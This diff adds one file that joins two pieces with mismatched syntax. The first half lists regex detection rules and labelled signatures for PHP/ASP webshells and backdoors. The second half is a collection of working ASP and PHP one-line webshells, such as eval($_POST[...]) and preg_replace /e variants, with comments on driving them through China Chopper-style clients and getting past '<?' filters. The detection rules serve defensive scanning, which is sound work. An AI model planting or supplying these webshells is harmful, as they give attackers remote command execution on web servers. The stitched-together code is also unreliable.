@@ -1,0 +1,167 @@
+rulelist = [
+  '(\$_(GET|POST|REQUEST)\[.{0,15}\]\(\$_(GET|POST|REQUEST)\[.{0,15}\]\))',
+  '(base64_decode\([\'"][\w\+/=]{200,}[\'"]\))',
+  'eval\(base64_decode\(',
+  '(eval\(\$_(POST|GET|REQUEST)\[.{0,15}\]\))',
+  '(assert\(\$_(POST|GET|REQUEST)\[.{0,15}\]\))',
+  '(\$[\w_]{0,15}\(\$_(POST|GET|REQUEST)\[.{0,15}\]\))',
+  '(wscript\.shell)',
+  '(gethostbyname\()',
+  '(cmd\.exe)',
+  '(shell\.application)',
+  '(documents\s+and\s+settings)',
+  '(system32)',
+  '(serv-u)',
+  '(提权)',
+  '(phpspy)',
+  '(后门)',
+  '(webshell)',
+  '(Program\s+Files)',
+  'www.phpdp.com',
+  'phpdp',
+  'PHP神盾',
+  'decryption',
+  'Ca3tie1',
+  'GIF89a',
+  'IKFBILUvM0VCJD\/APDolOjtW0tgeKAwA',
+  '\'e\'\.\'v\'\.\'a\'\.\'l\'',
+]
+
+
+'后门特性->cha88.cn'=>'cha88\.cn',
+'后门特性->c99shell'=>'c99shell',
+'后门特性->phpspy'=>'phpspy',
+'后门特性->Scanners'=>'Scanners',
+'后门特性->cmd.php'=>'cmd\.php',
+'后门特性->str_rot13'=>'str_rot13',
+'后门特性->webshell'=>'webshell',
+'后门特性->DDOS'=>'$fp = fsockopen',
+'后门特性->EgY_SpIdEr'=>'EgY_SpIdEr',
+'后门特性->tools88.com'=>'tools88\.com',
+'后门特性->SECFORCE'=>'SECFORCE',
+'后门特性->eval("?>'=>'eval\((\'|")\?>',
+'可疑代码特性->system('=>'system\(',
+'可疑代码特性->passthru('=>'passthru\(',
+'可疑代码特性->shell_exec('=>'shell_exec\(',
+'可疑代码特性->exec('=>'exec\(',
+'可疑代码特性->popen('=>'popen\(',
+'可疑代码特性->proc_open'=>'proc_open',
+'可疑代码特性->eval($'=>'eval\((\'|"|\s*)\\$',
+'可疑代码特性->assert($'=>'assert\((\'|"|\s*)\\$',
+'伤害MYSQL代码->returns string soname'=>'returnsstringsoname',
+'伤害MYSQL代码->into outfile'=>'intooutfile',
+'伤害MYSQL代码->load_file'=>'select(\s+)(.*)load_file',
+'减稀后门特性->eval(gzinflate('=>'eval\(gzinflate\(',
+'减稀后门特性->eval(base64_decode('=>'eval\(base64_decode\(',
+'减稀后门特性->eval(gzuncompress('=>'eval\(gzuncompress\(',
+'减稀后门特性->eval(gzdecode('=>'eval\(gzdecode\(',
+'减稀后门特性->eval(str_rot13('=>'eval\(str_rot13\(',
+'减稀后门特性->gzuncompress(base64_decode('=>'gzuncompress\(base64_decode\(',
+'减稀后门特性->base64_decode(gzuncompress('=>'base64_decode\(gzuncompress\(',
+'一句话后门特性->eval($_'=>'eval\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->assert($_'=>'assert\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->require($_'=>'require\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->require_once($_'=>'require_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->include($_'=>'include\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->include_once($_'=>'include_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->call_user_func("assert"'=>'call_user_func\(("|\')assert("|\')',
+'一句话后门特性->call_user_func($_'=>'call_user_func\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'一句话后门特性->$_POST/GET/REQUEST/COOKIE[?]($_POST/GET/REQUEST/COOKIE[?]'=>'\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\]\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[',
+'一句话后门特性->echo(file_get_contents($_POST/GET/REQUEST/COOKIE'=>'echo\(file_get_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'上传后门特性->file_put_contents($_POST/GET/REQUEST/COOKIE,$_POST/GET/REQUEST/COOKIE'=>'file_put_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\],(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
+'上传后门特性->fputs(fopen("?","w"),$_POST/GET/REQUEST/COOKIE['=>'fputs\(fopen\((.+),(\'|")w(\'|")\),(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[',
+'.htaccess插马特性->SetHandler application/x-httpd-php'=>'SetHandlerapplication\/x-httpd-php',
+'.htaccess插马特性->php_value auto_prepend_file'=>'php_valueauto_prepend_file',
+'.htaccess插马特性->php_value auto_append_file'=>'php_valueauto_append_file'
+
+
+
+asp一句话木马程序代码
+
+<%eval request(“sb”)%>
+
+程序代码
+
+<%execute request(“sb”)%>
+
+程序代码
+
+<%execute(request(“sb”))%>
+
+程序代码
+
+<%execute request(“sb”)%><%'<% loop <%:%>
+
+程序代码
+
+<%'<% loop <%:%><%execute request(“sb”)%>
+
+程序代码
+
+<%execute request(“sb”)'<% loop <%:%>[code]
+[code]<script language=vbs runat=server>eval(request(“sb”))</script>
+
+程序代码
+
+%><%Eval(Request(chr(35)))%><%
+
+程序代码
+
+<%eval request(“sb”)%>
+
+程序代码
+
+<%ExecuteGlobal request(“sb”)%>
+
+程序代码
+
+if Request(“sb”)<>”” then ExecuteGlobal request(“sb”) end if
+    //容错代码
+
+    程序代码
+
+    <%@LANGUAGE=”JAVASCRIPT” CODEPAGE=”65001″%>
+    <%
+    var lcx = {‘名字’ : Request.form(‘#’), ‘性别’ : eval, ‘年龄’ : ’18’, ‘昵称’ : ‘请叫我一声老大’};
+    lcx.性别((lcx.名字)+”);
+    %>
+
+    php一句话
+
+    程序代码
+
+    <?php eval($_POST[sb])?>
+
+    程序代码
+
+    <?php @eval($_POST[sb])?> //容错代码
+
+    程序代码
+
+    <?php assert($_POST[sb]);?> //使用lanker一句话客户端的专家模式执行相关的php语句
+
+    程序代码
+
+    <?$_POST[‘sa’]($_POST[‘sb’]);?>
+
+    程序代码
+
+    <?$_POST[‘sa’]($_POST[‘sb’],$_POST[‘sc’])?>
+
+    程序代码
+
+    <?php
+    @preg_replace(“/[email]/e”,$_POST[‘h’],”error”);
+    ?>
+
+    //使用这个后,使用菜刀一句话客户端在配置连接的时候在”配置”一栏输入
+
+    程序代码
+
+    <O>h=@eval($_POST[c]);</O>
+
+    程序代码
+
+    <script language=”php”>@eval($_POST[sb])</script>
+
+    //绕过<?限制的一句话
